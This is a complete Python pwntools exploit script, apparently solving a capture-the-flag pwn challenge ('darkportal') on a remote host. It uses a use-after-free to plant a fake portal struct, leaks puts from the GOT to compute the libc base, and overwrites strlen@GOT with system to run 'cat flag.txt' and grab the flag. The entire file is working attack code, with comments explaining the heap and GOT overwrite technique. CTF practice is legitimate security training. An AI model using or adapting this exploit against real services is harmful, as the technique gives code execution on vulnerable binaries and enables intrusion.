#!/usr/bin/env python3
from __future__ import annotations

import re
from pwn import ELF, context, log, p32, remote


def main() -> int:
    context.clear(arch="i386", os="linux")

    elf = ELF("./darkportal", checksec=False)
    libc = ELF("./libc.so.6", checksec=False)

    host = "dark-portal.putcyberdays.pl"
    port = 8080

    def recv_menu(io) -> None:
        io.recvuntil(b"Thy command? > ")

    def choose(io, n: int) -> None:
        recv_menu(io)
        io.sendline(str(n).encode())

    def conjure(io, name: bytes, content_size: int, content: bytes) -> None:
        # create_portal(): reads 0x17 bytes for name and (content_size-1) bytes for content
        assert 0 < content_size <= 0x1000
        assert len(content) == content_size - 1

        choose(io, 1)
        io.recvuntil(b"Portal name: ")
        io.send(name + b"\n")
        io.recvuntil(b"Content size: ")
        io.sendline(str(content_size).encode())
        io.recvuntil(b"Content: ")
        io.send(content)

    def banish(io, idx: int) -> None:
        choose(io, 2)
        io.recvuntil(b"Index: ")
        io.sendline(str(idx).encode())

    def reshape(io, idx: int, data: bytes) -> None:
        choose(io, 3)
        io.recvuntil(b"Index: ")
        io.sendline(str(idx).encode())
        io.recvuntil(b"New content: ")
        io.send(data)

    def inscribe(io, size: int, data: bytes) -> None:
        choose(io, 4)
        io.recvuntil(b"Note size: ")
        io.sendline(str(size).encode())
        io.recvuntil(b"Note content: ")
        assert len(data) == size
        io.send(data)

    def activate(io, idx: int) -> None:
        choose(io, 5)
        io.recvuntil(b"Index: ")
        io.sendline(str(idx).encode())

    def fake_portal(content_ptr: int) -> bytes:
        # struct portal (malloc(0x20)) layout from disassembly:
        #   +0x00: vtable ptr -> default_vtable
        #   +0x04: name/padding (0x18 bytes)
        #   +0x1c: content ptr
        return p32(elf.sym["default_vtable"]) + (b"B" * 0x18) + p32(content_ptr)

    io = remote(host, port)

    # 1) Leak libc via UAF portal -> safe_process() prints portal->content as %s.
    #    We repoint content to puts@GOT and parse the first 4 leaked bytes.
    conjure(io, b"p0", 0x20, b"A" * 0x1F)
    banish(io, 0)  # portals[0] is left dangling (UAF)
    inscribe(io, 0x20, fake_portal(elf.got["puts"]))
    activate(io, 0)

    io.recvuntil(b"[*] Content: ")
    puts_addr = int.from_bytes(io.recvn(4), "little")
    libc_base = puts_addr - libc.symbols["puts"]
    system_addr = libc_base + libc.symbols["system"]

    log.info("puts@libc = %#x", puts_addr)
    log.info("libc base  = %#x", libc_base)
    log.info("system@libc= %#x", system_addr)

    # 2) Overwrite strlen@GOT with system using edit_portal() as a write primitive:
    #    edit_portal does: strlen(portal->content) then read(0, portal->content, <that len>)
    #    Point portal->content at strlen@GOT and write system address there.
    conjure(io, b"p1", 0x20, b"A" * 0x1F)
    banish(io, 1)
    inscribe(io, 0x20, fake_portal(elf.got["strlen"]))
    reshape(io, 1, p32(system_addr))

    # 3) Trigger system("cat flag.txt") by calling edit_portal() on a real portal.
    cmd = b"cat flag.txt\x00"
    payload = cmd.ljust(0x1F, b"C")
    conjure(io, b"p2", 0x20, payload)

    # This call now executes system(portal->content) because strlen@GOT == system.
    reshape(io, 2, b"Z")

    data = io.recvrepeat(1.5)
    io.close()

    m = re.search(rb"putcCTF\{[^}]+\}", data)
    if not m:
        print(data.decode(errors="replace"))
        raise SystemExit("Flag not found in output")

    print(m.group(0).decode())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
